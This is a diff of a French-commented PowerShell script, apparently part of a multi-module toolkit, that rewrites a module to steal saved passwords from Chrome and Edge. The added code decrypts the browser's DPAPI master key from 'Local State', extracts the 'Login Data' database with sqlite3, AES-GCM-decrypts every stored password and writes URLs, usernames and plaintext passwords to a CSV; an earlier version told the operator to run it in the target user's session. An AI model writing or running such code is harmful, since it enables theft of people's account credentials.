@@ -161,26 +161,27 @@ function Export-BrowserPasswords {
 
 
 # ==============================================================================
-# MODULE 2.5 — DÉCHIFFREMENT DPAPI (Version recommandée)
+# MODULE 2.5 — DÉCHIFFREMENT DPAPI MODERNE (Chrome 80+ / Edge)
 # ==============================================================================
 function Decrypt-BrowserPasswords {
-    Write-Host "`n=== [MODULE 2.5] DÉCHIFFREMENT DPAPI CHROME/EDGE ===" -ForegroundColor Cyan
+    Write-Host "`n=== [MODULE 2.5] DÉCHIFFREMENT DPAPI MODERNE CHROME/EDGE ===" -ForegroundColor Cyan
 
     Write-Host "1. Chrome`n2. Edge"
     $choice = Read-Host "Choix"
 
     switch ($choice) {
-        "1" { $browser = "Chrome"; $base = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
-        "2" { $browser = "Edge";   $base = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
+        "1" { $browser = "Chrome"; $basePath = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
+        "2" { $browser = "Edge";   $basePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
         default { Write-Host "Choix invalide." -ForegroundColor Red; return }
     }
 
-    if (-not (Test-Path $base)) {
+    if (-not (Test-Path $basePath)) {
         Write-Host "$browser non trouvé." -ForegroundColor Red
         return
     }
 
-    $profiles = Get-ChildItem $base -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }
+    # Liste des profils avec vrai nom
+    $profiles = Get-ChildItem $basePath -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }
     Write-Host "`nProfils disponibles :" -ForegroundColor Yellow
     $list = @()
 
@@ -192,39 +193,51 @@ function Decrypt-BrowserPasswords {
             try {
                 $json = Get-Content $pref -Raw -Encoding UTF8 | ConvertFrom-Json
                 if ($json.profile.name) { $displayName = $json.profile.name }
-            } catch { }
+            } catch {}
         }
         Write-Host "  $($i+1). $displayName  [$($p.Name)]" -ForegroundColor White
-        $list += [PSCustomObject]@{ Index = $i; Folder = $p; Display = $displayName }
+        $list += [PSCustomObject]@{Index=$i; Folder=$p; Display=$displayName}
     }
 
     $num = Read-Host "`nNuméro du profil"
-    $selected = $list[$num - 1]
-    if (-not $selected) { Write-Host "Numéro invalide." -ForegroundColor Red; return }
+    $selected = $list[$num-1]
+    if (-not $selected) { Write-Host "Numéro invalide" -ForegroundColor Red; return }
 
-    $dbPath = Join-Path $selected.Folder.FullName "Login Data"
-    if (-not (Test-Path $dbPath)) {
-        Write-Host "Fichier Login Data introuvable." -ForegroundColor Red
+    $loginDb = Join-Path $selected.Folder.FullName "Login Data"
+    $localState = Join-Path $selected.Folder.Parent.FullName "Local State"
+
+    if (-not (Test-Path $loginDb)) {
+        Write-Host "Login Data introuvable." -ForegroundColor Red
         return
     }
 
     $outputCsv = "$ExportFolder\${browser}_Passwords_Decrypted_${Date}.csv"
 
     try {
-        $tempDb = "$env:TEMP\LoginData_temp.db"
-        Copy-Item $dbPath $tempDb -Force
+        # === 1. Récupération et déchiffrement de la Master Key ===
+        $state = Get-Content $localState -Raw -Encoding UTF8 | ConvertFrom-Json
+        $b64key = $state.os_crypt.encrypted_key
+        $encryptedKey = [Convert]::FromBase64String($b64key)
+        $masterKey = $encryptedKey[5..$encryptedKey.Length]  # Suppression des 5 premiers bytes (DPAPI)
 
-        $sqlite = Get-Command "sqlite3.exe" -ErrorAction SilentlyContinue
+        Add-Type -AssemblyName System.Security
+        $unprotected = [System.Security.Cryptography.ProtectedData]::Unprotect($masterKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+
+        Write-Host "✓ Clé maître récupérée" -ForegroundColor Green
+
+        # === 2. Extraction via sqlite3 ===
+        $tempDb = "$env:TEMP\LoginData_$(Get-Random).db"
+        Copy-Item $loginDb $tempDb -Force
+
+        $sqlite = Get-Command sqlite3.exe -ErrorAction SilentlyContinue
         if (-not $sqlite) {
-            Write-Host "[ERREUR] sqlite3.exe non trouvé !" -ForegroundColor Red
-            Write-Host "Télécharge-le sur https://sqlite.org/download.html et place-le dans C:\Windows\System32" -ForegroundColor Yellow
+            Write-Host "[ERREUR] sqlite3.exe manquant !" -ForegroundColor Red
             return
         }
 
-        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE password_value NOT NULL;"
+        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE length(password_value) > 0;"
         $rows = & sqlite3.exe $tempDb $query 2>$null
 
-        Add-Type -AssemblyName System.Security
         $results = @()
 
         foreach ($row in $rows) {
@@ -232,38 +245,58 @@ function Decrypt-BrowserPasswords {
             if ($f.Count -ge 3) {
                 $url = $f[0]
                 $user = $f[1]
+                $encPassword = $f[2]
+
                 try {
-                    # password_value est généralement en hexadécimal avec sqlite3
-                    $hex = $f[2]
-                    $bytes = [byte[]]::new($hex.Length / 2)
-                    for ($i = 0; $i -lt $hex.Length; $i += 2) {
-                        $bytes[$i/2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
+                    # Conversion hex → bytes
+                    $bytes = [byte[]]::new($encPassword.Length / 2)
+                    for ($j = 0; $j -lt $encPassword.Length; $j += 2) {
+                        $bytes[$j/2] = [Convert]::ToByte($encPassword.Substring($j, 2), 16)
                     }
-                    $plain = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                    $password = [System.Text.Encoding]::UTF8.GetString($plain)
+
+                    # AES-GCM decryption (version Chrome moderne)
+                    $password = Decrypt-ChromePassword $bytes $unprotected
                 } catch {
                     $password = "[ERREUR_DECHIFFREMENT]"
                 }
-                $results += [PSCustomObject]@{ URL = $url; Username = $user; Password = $password }
+
+                $results += [PSCustomObject]@{
+                    URL      = $url
+                    Username = $user
+                    Password = $password
+                }
             }
         }
 
         Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
 
         if ($results.Count -gt 0) {
-            $results | Export-Csv -Path $outputCsv -Encoding UTF8 -NoTypeInformation
-            Write-Host "✓ $($results.Count) mots de passe déchiffrés !" -ForegroundColor Green
+            $results | Export-Csv -Path $outputCsv -NoTypeInformation -Encoding UTF8
+            Write-Host "`n✓ $($results.Count) mots de passe déchiffrés avec succès !" -ForegroundColor Green
             Write-Host "Fichier : $outputCsv" -ForegroundColor Green
         } else {
             Write-Host "Aucun mot de passe trouvé." -ForegroundColor Yellow
         }
     }
     catch {
-        Write-Host "[ERREUR] Déchiffrement : $_" -ForegroundColor Red
-        Write-Host "→ Exécute ce module dans la session de l'utilisateur cible." -ForegroundColor DarkYellow
+        Write-Host "[ERREUR] $_" -ForegroundColor Red
     }
 }
 
+# Fonction de déchiffrement AES-GCM Chrome
+function Decrypt-ChromePassword($encryptedBytes, $masterKey) {
+    if ($encryptedBytes.Length -lt 15) { return "[TROP_COURT]" }
+
+    $iv = $encryptedBytes[3..14]                    # 12 bytes IV
+    $ciphertext = $encryptedBytes[15..($encryptedBytes.Length - 17)]
+    $tag = $encryptedBytes[($encryptedBytes.Length - 16)..($encryptedBytes.Length - 1)]
+
+    $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)
+    $decrypted = [byte[]]::new($ciphertext.Length)
+    $aes.Decrypt($iv, $ciphertext, $tag, $decrypted)
+
+    return [System.Text.Encoding]::UTF8.GetString($decrypted)
+}
 
 # ==============================================================================
 # MODULE 3 — BLOCAGE PARTAGE CONNEXION
